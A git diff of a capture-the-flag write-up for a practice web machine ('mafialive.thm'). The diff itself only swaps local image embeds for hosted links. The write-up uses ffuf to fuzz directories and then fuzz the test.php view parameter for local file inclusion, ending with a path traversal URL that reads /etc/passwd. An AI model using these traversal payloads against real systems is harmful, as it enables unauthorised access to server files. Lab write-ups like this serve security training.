@@ -10,34 +10,35 @@ And by scanning with nmap:
 
 
 Let's browse the IP:
-![[Pasted image 20251025122524.png]]
+![](https://github.com/user-attachments/assets/2831506c-307f-42f4-b3c0-2ec9bf728fbb)
 As we can see, there's a hint for a "mafialive.thm" domain, so let's add this domain to the `etc/hosts` file:
 `sudo nano /etc/hosts`
-![[Pasted image 20251025121740.png]]
+![](https://github.com/user-attachments/assets/2831506c-307f-42f4-b3c0-2ec9bf728fbb)
 
-![[Pasted image 20251025122832.png]]
+
+![](https://github.com/user-attachments/assets/a3f0adb6-bdba-4e59-ad36-7e315f816e56)
 
 
 
 Now we can browse by typing the domain in the search bar and catch the first flag:
-![[Pasted image 20251025123251.png]]
+![](https://github.com/user-attachments/assets/00bdba25-e07f-448b-949a-9b2b5f44ac82)
 
 
 
 Next step is fuzzing the app, we will use ffuf for this:
 `ffuf -u "http://mafialive.thm/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .php -c -t 50 -r`
-![[Pasted image 20251030224128.png]]
+![](https://github.com/user-attachments/assets/c385a2e2-937a-469a-b5a3-edfeb80ed229)
 
 
 
 If we visit `robots.txt` page we can see that the only entry is `test.php` as ffuf let us see (last row).
-![[Pasted image 20251030224919.png]]
+
 
 
 Though we're in a CTF, we can click the test button without problems. In a real life scenario we should make sure that the button won't break anything.
 
 Let's click that button.
-![[Pasted image 20251030225337.png]]
+![](https://github.com/user-attachments/assets/6053ba40-f5d6-4ed3-aaeb-6fa62227d2a9)
 Now we're in `http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php`
 
 
@@ -48,7 +49,7 @@ Let's fuzz for LFI:
 Only to find out many false positives. 
 Let's try filtering through size and words:
 `ffuf -u "http://mafialive.thm/test.php?view=/var/www/html/development_testing/FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -c -t 50 -r -fs 286 -fw 41`
-![[Pasted image 20251031103317.png]]
+![](https://github.com/user-attachments/assets/fe5dd264-9e58-4be5-8d52-8f9daa0ddc83)
 We've succesfully exploited LFI. Let's inject the code in the URL to exfiltrate /etc/passwd
 
 `http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//..//..//..//etc/passwd`
